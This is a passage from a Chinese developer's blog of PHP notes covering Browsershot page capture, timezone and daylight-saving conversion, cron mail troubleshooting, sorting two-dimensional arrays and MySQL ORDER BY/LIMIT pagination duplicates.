class="keyword">function</span> <span class="title">getBodyHtml</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $newsUrl = <span class="string">'https://m.toutiao.com/i6546884151050502660/'</span>;</span><br><span class="line">    </span><br><span class="line">    $html = Browsershot::url($newsUrl)</span><br><span class="line">        -&gt;windowSize(<span class="number">480</span>, <span class="number">800</span>)</span><br><span class="line">        -&gt;userAgent(<span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'</span>)</span><br><span class="line">        -&gt;mobile()</span><br><span class="line">        -&gt;touch()</span><br><span class="line">        -&gt;bodyHtml();</span><br><span class="line"></span><br><span class="line">    \Log::info($html);</span><br><span class="line">&#125;</span><br><span class="line">use Spatie\Browsershot\Browsershot;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">getBodyHtml</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $newsUrl = <span class="string">'https://m.toutiao.com/i6546884151050502660/'</span>;</span><br><span class="line">    </span><br><span class="line">    Browsershot::url($newsUrl)</span><br><span class="line">        -&gt;windowSize(<span class="number">480</span>, <span class="number">800</span>)</span><br><span class="line">        -&gt;userAgent(<span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'</span>)</span><br><span class="line">        -&gt;mobile()</span><br><span class="line">        -&gt;touch()</span><br><span class="line">        -&gt;setDelay(<span class="number">1000</span>)</span><br><span class="line">        -&gt;save(public_path(<span class="string">'images/toutiao.jpg'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHP时区"><a href="#PHP时区" class="headerlink" title="PHP时区"></a>PHP时区</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>，北京英国标准时间时差是<span class="number">8</span>小时。</span><br><span class="line"><span class="number">2</span>，英国伦敦使用夏令时（夏时制）时时差是<span class="number">7</span>小时。</span><br><span class="line">北京时间为东八区的区时UTC+<span class="number">8</span>，英国伦敦为零时区的区时UTC+<span class="number">0</span>，两者时差为<span class="number">8</span>小时；</span><br><span class="line">当英国为夏时制时（提前一小时），时区变为UTC+<span class="number">1</span>，两者时差为<span class="number">7</span>小时。</span><br><span class="line">英国夏令时的区间：从<span class="number">3</span>月最后一个星期日到<span class="number">10</span>月最后一个星期日。</span><br><span class="line">参考：http:<span class="comment">//baike.baidu.com/view/37429.htm</span></span><br><span class="line">时差的计算方法：两个时区标准时间（即时区数）相减就是时差，时区的数值大的时间早。比如中国是东八区(+<span class="number">8</span>)，美国东部是西五区(<span class="number">-5</span>)，两地的时差是<span class="number">13</span>小时，北京比纽约要早<span class="number">13</span>个小时；如果是美国实行夏令时的时期，相差<span class="number">12</span>小时。</span><br><span class="line">英国与北京时间的时差是<span class="number">8</span>个小时，但其中英国属于夏令时国家，如果是夏令时（每年<span class="number">3</span>月最后一个星期日至<span class="number">10</span>月最后一个星期日）期间，中国和英国的时差是<span class="number">7</span>个小时。</span><br><span class="line"></span><br><span class="line"><span class="number">1884</span>年在华盛顿召开的一次国际子午线会议上，规定将全球划分为<span class="number">24</span>个时区（东、西各<span class="number">12</span>个时区），且同时规定了英国为为本初子午线，即零度经线。东<span class="number">1</span><span class="number">-12</span>区，西<span class="number">1</span><span class="number">-12</span>区，每个时区横跨经度<span class="number">15</span>度，时间正好是<span class="number">1</span>小时。最后的东、西第<span class="number">12</span>区各跨经度<span class="number">7.5</span>度，以东、西经<span class="number">180</span>度为界。</span><br><span class="line">中国首都北属于东八区，所以对比英国的零度经线，两者之间相差了<span class="number">8</span>个小时。但因为英国实行夏令时（每年<span class="number">3</span>月最后一个星期日至<span class="number">10</span>月最后一个星期日），则英国在天亮早的夏季人为将时间调快一小时可以使人早起早睡，减少照明量。那么英国与北京时间之间时差是<span class="number">7</span>个小时。</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取美国冬夏时令 //判断当前是否为夏令时，为真返回1，否则为0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAmericanSeason</span>(<span class="params">$market</span>)</span>&#123;</span><br><span class="line">	$localzone = date(<span class="string">"e"</span>);</span><br><span class="line">	<span class="comment">//date_default_timezone_set('US/Pacific-New');</span></span><br><span class="line">	$timezone = in_array($market, array(<span class="string">'LME'</span>, <span class="string">'LIFFE'</span>)) ? <span class="string">'Europe/London'</span> : <span class="string">'US/Pacific-New'</span>;</span><br><span class="line">	$season = date(<span class="string">"I"</span>);</span><br><span class="line">	date_default_timezone_set($localzone);</span><br><span class="line">	<span class="keyword">return</span> $season;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断美国那个时间段是否为夏令时https://gist.github.com/flowerains </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_dst</span>(<span class="params">$timestamp</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $timezone = date(<span class="string">'e'</span>); <span class="comment">//获取当前使用的时区</span></span><br><span class="line">    date_default_timezone_set(<span class="string">'US/Pacific-New'</span>); <span class="comment">//强制设置时区</span></span><br><span class="line">    $dst = date(<span class="string">'I'</span>,$timestamp); <span class="comment">//判断是否夏令时</span></span><br><span class="line">    date_default_timezone_set($timezone); <span class="comment">//还原时区</span></span><br><span class="line">    <span class="keyword">return</span> $dst; <span class="comment">//返回结果</span></span><br><span class="line">&#125;</span><br><span class="line">print gmdate(<span class="string">"Y-m-d\TH:i:s\Z"</span>);</span><br><span class="line">$date_utc = <span class="keyword">new</span> \DateTime(<span class="string">"now"</span>, <span class="keyword">new</span> \DateTimeZone(<span class="string">"UTC"</span>));</span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/8655515/get-utc-time-in-php/18808833</span></span><br><span class="line">echo $date_utc-&gt;format(\DateTime::RFC850); # Saturday, 18-Apr-15 03:23:46 UTC</span><br><span class="line">echo gmdate (<span class="string">"l d F Y H:i:s"</span>).<span class="string">" GMT"</span>; <span class="comment">//输出: Wednesday 09 April 2014 03:53:36 GMT</span></span><br><span class="line">GMT格林威治时间和本地的时间是有时差的, 我们知道php指定时区后用date() 函数获取的是本地时间, 如果想获取标准的GMT 格林威治时间就要用gmdate()函数了</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Converts a local Unix timestamp to GMT</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param   int Unix timestamp</span></span><br><span class="line"><span class="comment">     * @return  int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">local_to_gmt</span>(<span class="params">$time = <span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($time === <span class="string">''</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $time = time();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mktime(</span><br><span class="line">            gmdate(<span class="string">'G'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'i'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'s'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'n'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'j'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'Y'</span>, $time)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">   date_default_timezone_set(<span class="string">'Asia/Calcutta'</span>);</span><br><span class="line">   </span><br><span class="line">   $current_date = date(<span class="string">"Y/m/d g:i A"</span>);</span><br><span class="line">   </span><br><span class="line">   $ist_date = DateTime::createFromFormat(</span><br><span class="line">                           <span class="string">'"Y/m/d g:i A"'</span>,</span><br><span class="line">                           $current_date,</span><br><span class="line">                           <span class="keyword">new</span> DateTimeZone(<span class="string">'Asia/Calcutta'</span>)</span><br><span class="line">                       );</span><br><span class="line">   </span><br><span class="line">   $utc_date = clone $ist_date;</span><br><span class="line">   $utc_date-&gt;setTimeZone(<span class="keyword">new</span> DateTimeZone(<span class="string">'UTC'</span>));</span><br><span class="line">   </span><br><span class="line">   echo <span class="string">'UTC:  '</span> . $utc_date-&gt;format(<span class="string">'Y-m-d g:i A'</span>); </span><br><span class="line">    $time = gmmktime();</span><br><span class="line">    echo date(<span class="string">"Y-m-d H:i:s"</span>, $time); </span><br><span class="line">    date_default_timezone_set(<span class="string">"UTC"</span>);</span><br><span class="line">date(<span class="string">"Y-m-d H:i:s"</span>, time() - date(<span class="string">"Z"</span>))</span><br><span class="line">date_default_timezone_set(<span class="string">'Australia/Brisbane'</span>);</span><br><span class="line">echo gmdate(<span class="string">'c'</span>);<span class="comment">///2018-01-12T16:10:11+00:00</span></span><br><span class="line">最好是一直使用 UTC 时间。服务器使用，自己开发默认也是，然后存入数据库也是，这样的话把数据显示给用户看的话转换为适当时区的日期和时间就行了。</span><br><span class="line">时间戳是指格林尼治时间（GMT）<span class="number">1970</span>年<span class="number">01</span>月<span class="number">01</span>日<span class="number">00</span>时<span class="number">00</span>分<span class="number">00</span>秒到当前时间的总秒数。https:<span class="comment">//www.php.net/manual/en/timezones.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">st_date</span>(<span class="params">$format,$timestamp = false</span>) </span>&#123;</span><br><span class="line">  $timestamp = is_numberic($timestamp) ? $timestamp : time();</span><br><span class="line">  <span class="keyword">return</span> gmdate($format,$timestamp + <span class="number">8</span>*<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line">这样就可以保证这段代码无论在哪里，都可以输出东八区的时间。</span><br><span class="line">$triggerOn = <span class="string">'04/01/2013 03:08 PM'</span>;</span><br><span class="line">$user_tz = <span class="string">'America/Los_Angeles'</span>;</span><br><span class="line"></span><br><span class="line">echo $triggerOn; <span class="comment">// echoes 04/01/2013 03:08 PM</span></span><br><span class="line"></span><br><span class="line">$schedule_date = <span class="keyword">new</span> DateTime($triggerOn, <span class="keyword">new</span> DateTimeZone($user_tz) );</span><br><span class="line">$schedule_date-&gt;setTimeZone(<span class="keyword">new</span> DateTimeZone(<span class="string">'UTC'</span>));</span><br><span class="line">$triggerOn =  $schedule_date-&gt;format(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line"></span><br><span class="line">echo $triggerOn; <span class="comment">// echoes 2013-04-01 22:08:00</span></span><br><span class="line"></span><br><span class="line">格林威治时间（Greenwich Mean Time, GMT）。</span><br><span class="line"></span><br><span class="line">通用协调时间（Universal Time Coordinated, UTC）。UTC的表示方式为：年（y）、月（m）、日（d）、时（h）、分（min）、秒（s），均用数字表示。若以「世界标准时间」的角度来说，UTC比GMT来得更加精准： *UTC = GMT +<span class="regexp">/- 0.9* 。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">本地时间(locale time)：很显然，本地时间跟时区(timezone)有关： *本地时间 = UTC + 时区* 。例如，中国北京标准时间（忽略GMT和UTC的差异）： *CST = GMT + 8 = UTC + 8* 。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Unix时间戳(Unix timestamp)，又称 Unix时间(Unix time) 或 POSIX时间(POSIX time) ，它从格林威治时间1970年01月01日00时00分00秒起至现在的总秒数。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$usersNow = new DateTime('now', new DateTimeZone("+8"));/</span><span class="regexp">/php5.5+</span></span><br><span class="line"><span class="regexp">echo $usersNow-&gt;format(DateTime::RFC3339);/</span><span class="regexp">/2019-04-18T17:16:12+08:00</span></span><br><span class="line"><span class="regexp">$usersNow = new DateTime('now', new DateTimeZone('+0300'));</span></span><br><span class="line"><span class="regexp">$original = new DateTime("now", new DateTimeZone('UTC'));</span></span><br><span class="line"><span class="regexp">$timezoneName = timezone_name_from_abbr("", 3*3600, false);</span></span><br><span class="line"><span class="regexp">$modified = $original-&gt;setTimezone(new DateTimezone($timezoneName));</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$date = date_create('2000-01-01', timezone_open('Pacific/</span>Nauru<span class="string">'));</span></span><br><span class="line"><span class="string">echo date_format($date, '</span>Y-m-d H:i:sP<span class="string">') . "\n";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">date_timezone_set($date, timezone_open('</span>Pacific/Chatham<span class="string">'));</span></span><br><span class="line"><span class="string">echo date_format($date, '</span>Y-m-d H:i:sP<span class="string">') . "\n";</span></span><br><span class="line"><span class="string">为什么要时间戳？因为从0开始运行的秒数永远相等，即使出现润秒，也并不影响时间戳。</span></span><br><span class="line"><span class="string">php在使用date函数的时候，会依照所在时区去进行计算。date()进行输出的时间，就是我们所说的本地时间。</span></span><br><span class="line"><span class="string">可变：date()不可变：time()、gmdate()</span></span><br><span class="line"><span class="string">// 方法1date('</span>Y-m-d H:i:s<span class="string">',strtotime(gmdate('</span>Y-m-d H:i:s<span class="string">').'</span> +<span class="number">8</span> hours<span class="string">'));</span></span><br><span class="line"><span class="string">// 方法2（推荐）gmdate('</span>Y-m-d H:i:s<span class="string">',time() + 8*3600);</span></span><br><span class="line"><span class="string">$gmt_date = date('</span>Y-m-d H:i:s<span class="string">',time() - date('</span>Z<span class="string">'));</span></span><br><span class="line"><span class="string">$local_time = gmdate('</span>Y-m-d H:i:s<span class="string">',time() + date('</span>Z<span class="string">'));</span></span><br><span class="line"><span class="string">但这和$local_time = date('</span>Y-m-d H:i:s<span class="string">');没有任何结果上的区别。</span></span><br><span class="line"><span class="string">只保存timestamp，也就是time()，它的值是固定的，不随着时区的调整而改变，即使更换了服务器，它的误差也很小，所以有利于今后将程序分发部署到不同的服务器上面。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          function toTimeZone($src, $from_tz = '</span>America/Denver<span class="string">', $to_tz = '</span>Asia/Shanghai<span class="string">', $fm = '</span>Y-m-d H:i:s<span class="string">') &#123;</span></span><br><span class="line"><span class="string">              $datetime = new DateTime($src, new DateTimeZone($from_tz));</span></span><br><span class="line"><span class="string">              $datetime-&gt;setTimezone(new DateTimeZone($to_tz));</span></span><br><span class="line"><span class="string">              return $datetime-&gt;format($fm);</span></span><br><span class="line"><span class="string">          &#125;                                                     </span></span><br><span class="line"><span class="string">$time_zone = "GMT+8";</span></span><br><span class="line"><span class="string">$time = time();</span></span><br><span class="line"><span class="string">$date = date_create(date("Y-m-d H:i", $time), timezone_open('</span>UTC<span class="string">'));</span></span><br><span class="line"><span class="string">$date = date_timezone_set($date, timezone_open($time_zone));</span></span><br><span class="line"><span class="string">$date = date_format($date, '</span>Y-m-d H:i<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo date("Y-m-d H:i:s"); </span></span><br><span class="line"><span class="string">// date() 返回的是:　当前(这一刻 time()函数执行/返回时) GMT标准时间 的"本地化时间" 的自定义格式时间</span></span><br><span class="line"><span class="string">// date()跟php系统设置的时区有关!</span></span><br><span class="line"><span class="string">echo gmdate("Y-m-d H:i:s");</span></span><br><span class="line"><span class="string">// gmdate() 返回的是:　当前(这一刻 time()函数执行/返回时) GMT标准时间  的自定义格式时间</span></span><br><span class="line"><span class="string">// gmdate() 跟你现在所处的位置无关, 跟php系统设置的时区无关!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就说，　date()和gmdate()的区别, 仅仅在于 处理的时间 是不同的!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INSERT INTO `table` (id, time) VALUES(NULL, UNIX_TIMESTAMP()); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// or http://cn.voidcc.com/question/p-fvgnwppc-bc.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$time = time(); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$query = "INSERT INTO `table` (id, time) VALUES(NULL, $time); </span></span><br><span class="line"><span class="string">如果你想从数据库中选择它作为一个DATETIME，你可以这样做：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT *, FROM_UNIXTIME(time) as dt FROM `table` WHERE 1 </span></span><br><span class="line"><span class="string">产生的dt栏会格式为yyyy-MM-dd hh:mm:ss。</span></span><br></pre></td></tr></table></figure>
<h3 id="You-have-new-mail-in-var-spool-mail-root"><a href="#You-have-new-mail-in-var-spool-mail-root" class="headerlink" title="You have new mail in /var/spool/mail/root"></a>You have new mail in /var/spool/mail/root</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tac /<span class="keyword">var</span>/spool/mail/root |more</span><br><span class="line">PHP Fatal error:  require_once(): Failed opening required <span class="string">'../Redis/RedisManager.php'</span> (include_path=<span class="string">'.:/usr/local/lib/php</span></span><br><span class="line"><span class="string">/:/usr/share/pear:/usr/share/php'</span>) <span class="keyword">in</span> /cron/test.php on line <span class="number">8</span></span><br><span class="line"></span><br><span class="line">crotnab -e</span><br><span class="line">*<span class="regexp">/5 * * * 1-6 cd /</span>cron/;<span class="regexp">/usr/</span>local/bin/php /cron/test.php -t <span class="number">15</span> </span><br><span class="line"></span><br><span class="line">tail -f /<span class="keyword">var</span>/log/cron</span><br><span class="line">Apr <span class="number">18</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">02</span> xk<span class="number">-6</span><span class="number">-240</span>-a8 CROND[<span class="number">23941</span>]: (root) CMD (<span class="regexp">/usr/</span>lib64/sa/sa1 <span class="number">1</span> <span class="number">1</span>)</span><br><span class="line"> Apr <span class="number">18</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">02</span> xk<span class="number">-6</span><span class="number">-240</span>-a8 CROND[<span class="number">23942</span>]: (root) CMD (cd /cron/;<span class="regexp">/usr/</span>local/bin/php /cron/test.php -t <span class="number">15</span></span><br></pre></td></tr></table></figure>
<h3 id="对二维数组进行排序"><a href="#对二维数组进行排序" class="headerlink" title="对二维数组进行排序"></a>对二维数组进行排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对二维数组进行按字段排序</span></span><br><span class="line"><span class="comment"> * @param array $array 要排序的二维数组</span></span><br><span class="line"><span class="comment"> * @param bool $orderby 根据该字段（二维数组单个元素中的键名）排序</span></span><br><span class="line"><span class="comment"> * @param string $order 排序方式，asc:升序；desc:降序（默认）</span></span><br><span class="line"><span class="comment"> * @param string $children 子元素字段（键名），当元素含有该字段时，进行递归排序</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_orderby</span>(<span class="params">&amp;$array,$orderby = null,$order = <span class="string">'desc'</span>,$children = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($orderby == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">  $key_value = $new_array = array();</span><br><span class="line"></span><br><span class="line">  foreach($array <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    $key_value[$k] = $v[$orderby];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($order == <span class="string">'asc'</span>) &#123;</span><br><span class="line">    asort($key_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    arsort($key_value);</span><br><span class="line">  &#125;</span><br><span class="line">  reset($key_value);</span><br><span class="line"></span><br><span class="line">  foreach($key_value <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    $new_array[$k] = $array[$k];</span><br><span class="line">    <span class="comment">// 如果有children</span></span><br><span class="line">    <span class="keyword">if</span>($children &amp;&amp; isset($new_array[$k][$children])) &#123;</span><br><span class="line">      $new_array[$k][$children] = array_sort($new_array[$k][$children]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new_array = array_values($new_array); <span class="comment">// 使键名从0开始升序排列</span></span><br><span class="line">  $array = $new_array;</span><br><span class="line">  <span class="keyword">return</span> $new_array;</span><br><span class="line">&#125;</span><br><span class="line">$a = array(</span><br><span class="line">  array(<span class="string">'name'</span> =&gt; <span class="string">'Kenvi'</span>,<span class="string">'age'</span> =&gt; <span class="number">18</span>),</span><br><span class="line">  array(<span class="string">'name'</span> =&gt; <span class="string">'Nance'</span>,<span class="string">'age'</span> =&gt; <span class="number">21</span>),</span><br><span class="line">  .....</span><br><span class="line">);</span><br><span class="line">array_orderby($a,<span class="string">'age'</span>,<span class="string">'asc'</span>); <span class="comment">// 或者$a = array_orderby($a,'age','asc');</span></span><br><span class="line">$b = array(</span><br><span class="line">  array(</span><br><span class="line">    <span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'count'</span> =&gt; <span class="number">36</span>,</span><br><span class="line">    <span class="string">'children'</span> =&gt; array(</span><br><span class="line">      array(<span class="string">'id'</span> =&gt; <span class="number">76</span>,<span class="string">'count'</span> =&gt; <span class="number">40</span>),</span><br><span class="line">      array(<span class="string">'id'</span> =&gt; <span class="number">98</span>,<span class="string">'count'</span> =&gt; <span class="number">100</span>)</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">19</span>,<span class="string">'count'</span> =&gt; <span class="number">87</span>),</span><br><span class="line">  ......</span><br><span class="line">);</span><br><span class="line">array_orderby($b,<span class="string">'count'</span>,<span class="string">'desc'</span>,<span class="string">'children'</span>);</span><br><span class="line">https:<span class="comment">//www.tangshuang.net/2077.html</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql-orderby-limit-翻页数据重复"><a href="#mysql-orderby-limit-翻页数据重复" class="headerlink" title="mysql orderby limit 翻页数据重复"></a>mysql orderby limit 翻页数据重复</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">`post_title`</span>,<span class="string">`post_date`</span> FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">使用上述SQL查询的时候，很有可能出现和LIMIT <span class="number">0</span>,<span class="number">5</span>相同的某条记录，而如果使用：</span><br><span class="line"></span><br><span class="line">SELECT * FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">则不会出现重复的情况。但是，由于post表的字段很多，我仅仅希望用这两个字段，不想把post_content也查出来。为了解决这个情况，我在ORDER BY后面使用了两个排序条件来解决这个问题。</span><br><span class="line"></span><br><span class="line">SELECT <span class="string">`post_title`</span>,<span class="string">`post_date`</span> FROM post WHERE <span class="string">`post_status`</span>=<span class="string">'publish'</span> ORDER BY view_count desc,ID asc LIMIT <span class="number">5</span>,<span class="number">5</span></span><br><span class="line">按理来说，mysql的排序默认情况下是以主键ID作为排序条件的，也就是说，如果在view_count相等的情况下，主键ID作为默认的排序条件，不需要我们多此一举加ID asc。但是事实就是，mysql再order by和limit混用的时候，出现了排序的混乱情况。其后的机理我尚不得而知，在阅读这篇文章后，好像有所领悟，下面做一下猜测。</span><br><span class="line"></span><br><span class="line">这篇文章的解释是：https:<span class="comment">//www.tangshuang.net/1827.html</span></span><br><span class="line"></span><br><span class="line">在MySQL <span class="number">5.6</span>的版本上，优化器在遇到order by limit语句的时候，做了一个优化，即使用了priority queue。……</span><br><span class="line"></span><br><span class="line">使用 priority queue 的目的，就是在不能使用索引有序性的时候，如果要排序，并且使用了limit n，那么只需要在排序的过程中，保留n条记录即可，这样虽然不能解决所有记录都需要排序的开销，但是只需要 sort buffer 少量的内存就可以完成排序。</span><br><span 